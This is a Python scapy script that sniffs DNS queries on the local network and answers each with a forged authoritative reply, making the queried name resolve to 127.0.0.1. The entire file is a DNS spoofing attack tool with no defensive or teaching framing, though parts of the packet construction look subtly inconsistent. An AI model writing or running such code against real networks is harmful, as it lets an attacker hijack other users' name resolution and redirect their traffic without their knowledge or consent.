import sys
import time

from scapy import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sniff

MY_MAC = Ether().src
# SPOOFED_IP = sys.argv[1]


def spoof(packet):
    eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
    ip = IP(src=packet[IP].dst,dst=packet[IP].src)
    udp = UDP(dport=packet[UDP].sport,sport=packet[UDP].dport)
    dns = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        aa=1,
        rd=0,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        ar=DNSRR(
            rrname=packet[DNS].qd.qname,
            type='A',
            ttl=600,
            rdata='127.0.0.1')
    )
    response_packet = eth / ip / udp / dns
    response_packet.show()
    sendp(response_packet)
    """spoofed_response = DNS(rd=1, qd=DNSQR(qname="google.com", qtype="A"))
    sendp(spoofed_response)"""


if __name__ == '__main__':
    sniff(filter='udp dst port 53', prn=spoof)
